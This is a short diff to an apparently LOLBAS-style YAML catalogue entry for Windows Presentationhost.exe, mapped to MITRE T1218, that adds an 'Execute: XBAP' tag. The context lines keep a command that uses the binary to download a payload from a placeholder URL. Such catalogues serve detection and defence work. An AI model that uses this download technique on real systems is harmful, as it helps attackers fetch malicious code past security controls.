@@ -11,6 +11,8 @@ Commands:
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+    Tags:
+      - Execute: XBAP
   - Command: Presentationhost.exe https://example.com/payload
     Description: It will download a remote payload and place it in INetCache.
     Usecase: Downloads payload from remote server
